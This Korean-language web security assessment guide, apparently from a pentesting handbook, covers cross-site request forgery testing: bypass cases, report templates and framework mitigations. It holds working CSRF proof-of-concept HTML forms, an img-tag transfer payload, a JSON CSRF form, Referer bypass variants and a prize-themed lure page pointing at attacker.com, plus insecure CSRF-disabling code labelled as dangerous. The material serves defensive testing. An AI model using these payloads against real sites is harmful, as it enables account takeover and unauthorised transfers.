---
sidebar_position: 20
title: 크로스 사이트 요청 위조 (CSRF)
description: 웹 진단 - CSRF 점검 절차, 토큰/Referer/Origin 검증 우회, GET 변경, SameSite, PoC HTML 양식
keywords: [CSRF, XSRF, Cross-Site Request Forgery, SameSite, Anti-CSRF Token, Synchronizer Token, OWASP A01]
draft: false
---

# 크로스 사이트 요청 위조 (Cross-Site Request Forgery, CSRF)

> 인증된 사용자가 공격자 사이트 방문 시, 자신의 의도와 무관하게 대상 사이트로 **변경 요청** (이체·비밀번호 변경·권한 부여 등) 이 자동 전송되는 취약점.
> 관리자 대상 + 임팩트 큰 액션이면 단일 결함만으로 시스템 전체 침해까지 가능.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A01:2025 - Broken Access Control (CSRF는 권한 검증 카테고리에 포함, 별도 항목 아님) / KISA 권한 관리 |
| **CWE** | [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html) |
| **영향도** | 🔴 (관리자 대상 + 임팩트 큰 액션) / 🟡 (일반 사용자 + 사소한 액션) |
| **점검 난이도** | 하 (PoC HTML 작성 자체는 단순) |
| **예상 점검 시간** | 30분 ~ 2시간 (변경 액션 수에 비례) |

---

## 점검 목적

상태를 변경하는 모든 요청 (POST/PUT/DELETE/PATCH, 그리고 잘못 설계된 GET) 이 **공격자가 유도한 크로스사이트 요청** 으로 트리거되지 않도록 보호되어 있는지 확인한다. Anti-CSRF 토큰·SameSite 쿠키·Origin/Referer 검증 중 어떤 메커니즘이 적용되어 있고, 우회 가능한지 점검.

> 세션 쿠키 기반 인증 페이지가 주 대상. `Authorization: Bearer ...` 헤더만 사용하고 쿠키 세션을 안 쓰는 SPA/모바일 백엔드는 CSRF 영향이 본질적으로 없음.

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **CSRF 토큰 미적용** | Anti-CSRF 토큰 자체가 없음 |
| **CSRF 토큰 검증 미흡** | 값 존재 여부만 체크 / 빈 값 통과 / 다른 사용자 토큰 통과 |
| **Referer/Origin 검증 미흡** | Referer 빈 값 통과 / 부분 매칭 우회 |
| **GET 으로 상태 변경** | 변경 액션이 GET 으로 처리됨 — `<img src>` 한 줄로 트리거 |
| **SameSite 쿠키 미설정** | `SameSite=None` 또는 미설정 → 크로스사이트 자동 전송 |
| **JSON CSRF (한정)** | Content-Type 우회 가능한 경우 |

---

## 진단 절차

### Step 1. 변경 액션 매핑

Burp 시퀀스에서 다음을 모두 수집:

- POST / PUT / DELETE / PATCH 요청 전체
- **상태 변경하는 GET 요청** — 있으면 안 되지만 체크 (예: `/api/account/delete?id=42`)
- 인증 쿠키가 자동 전송되는 모든 변경 액션

### Step 2. CSRF 방어 메커니즘 식별

각 요청에서 다음 확인:

- **Anti-CSRF 토큰** — body / 헤더 (`X-CSRF-Token`, `X-XSRF-TOKEN`) / 별도 쿠키
- **Referer / Origin 헤더 검증** — 헤더 변조 시 응답 변화
- **SameSite 쿠키 속성** — 세션 쿠키의 `Set-Cookie` 헤더 (세션 관리 페이지 참조)

### Step 3. 우회 시도

토큰 제거/변조, Referer 제거/변조, GET 변환, JSON Content-Type 우회 (케이스 1~6).

### Step 4. PoC HTML 작성 + 다른 도메인 트리거 확인

다른 origin (`http://attacker.com/poc.html`) 에서 호스팅된 HTML 이 자동으로 변경 요청을 트리거하는지 실제 동작 확인. 보고서에 첨부할 HTML 파일도 이 단계에서 확정.

---

## 페이로드 / 테스트 케이스

### 케이스 1: CSRF 토큰 미적용 — 단순 PoC HTML

**언제 쓰는지**: Step 2에서 어떤 CSRF 방어도 식별되지 않을 때. 가장 단순하고 가장 자주 발견되는 케이스.

**PoC HTML (다른 도메인에서 호스팅):**

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" action="https://<TARGET>/api/profile/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**판정**: 다른 도메인(`http://attacker.com/poc.html`) 에서 페이지를 열었을 때 피해자(로그인 상태) 의 이메일이 `attacker@evil.com` 으로 변경되면 취약. 변경 후 이메일 인증 흐름이 없으면 영향도 더 큼.

### 케이스 2: 토큰 제거 / 빈 값 / 다른 사용자 토큰 우회

**언제 쓰는지**: CSRF 토큰이 있는 것처럼 보이지만, 검증이 미흡할 가능성을 확인할 때.

**시도 단계:**

```
1. 정상 요청: csrf_token=ABC123XYZ      → 200 OK

2. 토큰 파라미터 자체 제거 (필드 삭제) → 200 이면 취약
3. 토큰 빈 값: csrf_token=             → 200 이면 취약
4. 토큰 변조: csrf_token=AAAAAA        → 200 이면 취약 (값 검증 자체 안 함)
5. 다른 사용자(B) 의 토큰 사용:
   A 의 세션 쿠키 + B 의 토큰          → 200 이면 사용자별 검증 누락 (취약)
```

**판정**: 위 시도 중 하나라도 200 응답이면 토큰 검증 미흡. 특히 5번(다른 사용자 토큰 통과) 은 자주 발견되며, **토큰을 발급하지만 사용자 매칭은 안 함** 패턴.

### 케이스 3: Referer / Origin 검증 미흡

**언제 쓰는지**: CSRF 토큰 없이 Referer/Origin 만으로 방어하는 경우. 모던 환경에서는 Origin 검증이 표준.

**시도 단계:**

```
1. 정상 요청 (Referer: https://<TARGET>/profile)  → 200

2. Referer 헤더 자체 제거                 → 200 이면 취약
   (Referer 가 없을 때를 안전하게 본다는 잘못된 가정)

3. Referer 변조:
   Referer: https://attacker.com/<TARGET>/profile   ← 부분 매칭 우회
   Referer: https://<TARGET>.attacker.com/          ← 서브도메인 트릭
   → 통과 시 contains() 기반 검증 = 취약

4. Origin 검증만 있고 null Origin 통과:
   <iframe sandbox> 에서 발생하는 요청은 Origin: null
   서버가 null 을 화이트리스트로 처리하면 우회 가능
```

**판정**: 위 변형 중 하나로 정상 응답이 나오면 검증 우회 가능 = 취약.

### 케이스 4: GET 으로 상태 변경 (가장 위험한 단순 케이스)

**언제 쓰는지**: 변경 액션이 GET 으로 처리되는 경우. 옛날 시스템이나 잘못된 RESTful 설계에서 발견.

**예시 요청:**

```
GET /api/account/transfer?to=attacker&amount=1000000 HTTP/1.1
GET /admin/users/42/delete HTTP/1.1
GET /logout HTTP/1.1
```

**PoC — `<img>` 한 줄로 트리거:**

```html
<img src="https://<TARGET>/api/account/transfer?to=attacker&amount=1000000">
```

**판정**: 사용자가 공격자 페이지에 접속만 해도 (또는 위 페이로드가 들어간 게시글/이메일을 보기만 해도) 자동 실행. SameSite=Lax 환경에서도 GET 은 자동 전송되므로 SameSite 가 있어도 보호 안 됨.

> 단순 logout CSRF 도 있지만 영향도가 낮으므로 우선순위는 이체/권한 변경 같은 임팩트 큰 액션부터.

### 케이스 5: SameSite 쿠키 미설정 + 표준 POST CSRF

**언제 쓰는지**: 세션 관리 페이지에서 인증 쿠키의 SameSite 속성이 누락되었거나 `None` 인 경우.

**전제:**

```
Set-Cookie: SESSION=...; HttpOnly; Secure       ← SameSite 누락
Set-Cookie: SESSION=...; HttpOnly; SameSite=None  ← 명시적 None
```

**시나리오**: 케이스 1~4의 PoC 가 동일하게 동작. 모던 브라우저(Chrome 80+) 는 SameSite 미설정 시 `Lax` 를 기본값으로 적용하지만, 명시적으로 `None` 으로 설정된 경우 또는 옛날 환경에서는 여전히 POST CSRF 가능.

**판정**: SameSite 미흡 자체는 세션 페이지에서 보고. CSRF 페이지에서는 그 결함과 결합된 POST CSRF 가능성을 함께 보고.

### 케이스 6: JSON CSRF (한정 케이스)

**언제 쓰는지**: 백엔드 API 가 `Content-Type: application/json` 만 받으면 표준 CSRF 가 어려움. 단, **백엔드가 다른 Content-Type 도 받아주는 경우** 우회 가능.

**시나리오 6-1 — `text/plain` 으로 JSON 본문 전송:**

```html
<form action="https://<TARGET>/api/profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='dummy"}'>
</form>
<script>document.forms[0].submit();</script>
```

→ 실제 전송되는 본문: `{"email":"attacker@evil.com","ignore":"=dummy"}`

**시나리오 6-2 — `application/x-www-form-urlencoded` 로 보내도 백엔드가 JSON 파싱:**

일부 백엔드는 본문이 `{`로 시작하면 Content-Type 무시하고 JSON 으로 파싱. 이 경우 표준 form CSRF 가 그대로 통함.

**판정**: 위 변형 중 하나로 변경이 적용되면 취약. 모던 백엔드(Spring `@RequestBody`, Express `express.json()`) 는 Content-Type 검증이 엄격하므로 거의 안 통하지만, 점검 항목으로는 시도.

### 그 외 — 짧게 언급만 (실무 비중 낮음 / 영향도 낮음)

- **Login CSRF** — 공격자 계정으로 피해자가 로그인되도록 유도하는 변형. 가끔 발견되지만 영향도 낮음
- **CSRF + XSS 결합으로 토큰 추출** — XSS 가 있으면 그 자체가 더 큰 문제. 별도 다루지 않음
- **CORS 잘못 설정 + CSRF 결합** — `cors.md`(Priority 2) 로 분리

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 변경 액션에 **CSRF 토큰 / Referer / Origin 검증이 모두 없음**
- [ ] CSRF 토큰이 있지만 **빈 값 / 변조 값 / 다른 사용자 토큰** 으로 통과
- [ ] Referer 헤더 **제거 / 부분 매칭 우회** 로 통과
- [ ] **변경 액션이 GET** 으로 처리됨
- [ ] 세션 쿠키 **SameSite 미설정 / `None` 설정** + 표준 CSRF 가능
- [ ] JSON CSRF (Content-Type 우회) 로 변경 적용

**오탐 주의:**

- [ ] 인증 불필요한 공개 API 는 CSRF 대상 아님
- [ ] `Authorization: Bearer ...` 헤더만 사용하고 쿠키 세션 안 쓰는 API 는 CSRF 영향 없음 (브라우저가 헤더를 자동 추가하지 않음)
- [ ] 조회 요청은 CSRF 보호 불필요 (단, 케이스 4의 GET 변경은 별개)

---

## PoC 양식 (보고서 붙여넣기용)

**[CSRF] - 이메일 변경 기능에 CSRF 토큰 미적용**

1. 피해자 계정으로 `<TARGET>` 정상 로그인 후 세션 유지
2. 다른 도메인(`http://attacker.com/poc.html`) 에서 아래 HTML 호스팅
3. 피해자가 공격자 링크 클릭 시 자동으로 이메일이 변경됨

**PoC HTML (`poc.html` — 공격자 호스팅):**

```html
<!DOCTYPE html>
<html>
<head><title>경품 당첨 안내</title></head>
<body>
  <h1>경품 당첨을 축하드립니다!</h1>
  <p>잠시만 기다려주세요...</p>

  <form id="csrf" action="https://<TARGET>/api/profile/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**전송되는 요청 (피해자 브라우저 → TARGET):**

```http
POST /api/profile/email HTTP/1.1
Host: <TARGET>
Origin: http://attacker.com
Referer: http://attacker.com/poc.html
Cookie: SESSION=victim_session_token       ← 인증 쿠키 자동 전송
Content-Type: application/x-www-form-urlencoded

email=attacker%40evil.com
```

**응답 — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"ok","email":"attacker@evil.com"}
```

**확인 사항:**
- 요청 본문에 CSRF 토큰이 없는데도 정상 200 응답 + 이메일 변경 적용됨
- Origin 헤더가 `http://attacker.com` 인데 검증 없이 통과
- SameSite 미설정으로 인증 쿠키가 크로스사이트 요청에도 자동 전송됨
- 변경된 이메일로 비밀번호 재설정 메일을 받아 **계정 완전 탈취** 시나리오까지 입증 가능 (별첨 시나리오)

---

## 영향도 분석

- **무결성 (Integrity)**: 🔴 — CSRF 의 본질. 의도하지 않은 데이터/설정 변경.
- **기밀성 (Confidentiality)**: 🟡 — 직접 정보 노출은 적음, 단 이메일/비밀번호 변경 후 계정 탈취 → 정보 노출
- **가용성 (Availability)**: 🟡 — 계정 잠금/삭제 액션이 CSRF 가능하면 가용성 영향
- **추가 위협**:
  - **이메일 변경 → 비밀번호 재설정 → 계정 완전 탈취**
  - **관리자 대상 CSRF** — 사용자 권한 부여, 사용자 삭제, 시스템 설정 변경 (피싱 메일 + 관리자 클릭으로 트리거)
  - **이체/결제 CSRF** — 직접적 금전 손실
  - **권한 부여 CSRF** — `role=admin` 변경

**비즈니스 임팩트:**
CSRF 단독 결함이라도 이메일 변경 → 비밀번호 재설정 흐름과 결합되면 **계정 탈취** 로 이어지며, 관리자 대상 CSRF 는 시스템 침해와 동일한 등급. 실무 진단에서는 변경 액션마다 토큰/검증 적용 여부를 일일이 확인해야 누락된 엔드포인트를 잡을 수 있음.

---

## 대응방안

### 개발자 관점 (필수)

1. **Anti-CSRF 토큰 (Synchronizer Token Pattern)** — 가장 확실한 방어. **프레임워크 기본 기능 사용** 권장:
   - Django: `{% csrf_token %}` + `@csrf_protect` (기본 활성)
   - Spring Security: CSRF Protection 기본 활성, `CookieCsrfTokenRepository` 옵션
   - Express: `csrf-csrf` 또는 `lusca` (옛 `csurf` 는 deprecated)
   - Rails: `protect_from_forgery` (기본 활성)
   - 토큰 검증은 **사용자별** 로 매칭 (다른 사용자 토큰 거부)

2. **SameSite 쿠키** — `SameSite=Lax` (기본 권장) 또는 `Strict` (외부 인입이 적은 사이트). 세션 페이지의 정답과 동일.

3. **Origin / Referer 검증** — Anti-CSRF 토큰의 보조 수단으로 함께 적용:
   - Origin 헤더가 없거나 화이트리스트와 불일치하면 거부
   - **null Origin 도 거부** (sandbox iframe 등)
   - Referer 검증은 contains 가 아니라 정확한 도메인 매칭

4. **변경 액션은 GET 금지** — RESTful 원칙대로 POST/PUT/DELETE/PATCH 만 사용:
   - GET: 조회 (멱등, 안전)
   - POST/PUT/DELETE/PATCH: 변경 (CSRF 보호 필수)

5. **민감 액션은 비밀번호 재입력 / MFA 재확인** — 이체, 비밀번호 변경, 권한 부여, 계정 삭제 등은 토큰만으로 부족. 추가 인증 단계 권장.

6. **Content-Type 엄격 검증** (JSON CSRF 방어) — JSON API 는 `Content-Type: application/json` 만 허용, 다른 타입은 415 응답.

### 운영자 관점

1. **`X-Frame-Options: DENY`** 또는 **CSP `frame-ancestors 'none'`** — Clickjacking 방어 (CSRF 의 변형 공격 차단).

2. **HSTS** — HTTPS 강제로 MITM 통한 SameSite 우회 차단.

### 안전 / 위험 코드 비교 (스택별)

**Django:**

```python
# 위험 — CSRF 보호 비활성
@csrf_exempt        # 절대 사용 금지 (특수 케이스 외)
def update_email(request):
    request.user.email = request.POST['email']
    request.user.save()

# 안전 — Django 기본 보호 활용
# settings.py 에 'django.middleware.csrf.CsrfViewMiddleware' 활성 (기본)
# 템플릿에 {% csrf_token %} 포함
def update_email(request):
    if request.method == 'POST':
        request.user.email = request.POST['email']
        request.user.save()
        return JsonResponse({'status': 'ok'})

# AJAX 호출 시 헤더로 전송
# fetch('/update', { headers: { 'X-CSRFToken': getCookie('csrftoken') } })
```

**Spring Security:**

```java
// 위험 — CSRF 비활성
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.csrf().disable();          // 절대 금지 (REST API 에서 토큰 인증만 쓰는 경우 외)
}

// 안전 — 기본 보호 활성 + 쿠키 기반 토큰 (SPA 친화)
@Override
protected void configure(HttpSecurity http) throws Exception {
    http
        .csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        .and()
        // ... 다른 설정
        ;
}
// SPA 는 XSRF-TOKEN 쿠키를 읽어서 X-XSRF-TOKEN 헤더로 전송
```

**Express (Node.js):**

```javascript
// 위험 — CSRF 보호 없음
app.post('/api/profile/email', requireAuth, (req, res) => {
    req.user.email = req.body.email;
    req.user.save();
    res.json({ ok: true });
});

// 안전 — csrf-csrf 미들웨어 사용
const { doubleCsrf } = require('csrf-csrf');

const { generateToken, doubleCsrfProtection } = doubleCsrf({
    getSecret: () => process.env.CSRF_SECRET,
    cookieName: '__Host-csrf',
    cookieOptions: { httpOnly: true, secure: true, sameSite: 'lax' },
});

app.use(doubleCsrfProtection);

// 폼 렌더링 시 토큰 발급
app.get('/profile', requireAuth, (req, res) => {
    const token = generateToken(req, res);
    res.render('profile', { csrfToken: token });
});

// 클라이언트는 토큰을 헤더(X-CSRF-Token) 또는 form field 로 전송
app.post('/api/profile/email', requireAuth, (req, res) => {
    // doubleCsrfProtection 미들웨어가 자동 검증
    req.user.email = req.body.email;
    req.user.save();
    res.json({ ok: true });
});
```

---

## 참고자료

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
- [PortSwigger - Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [PortSwigger - Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
- [OWASP Testing Guide - CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
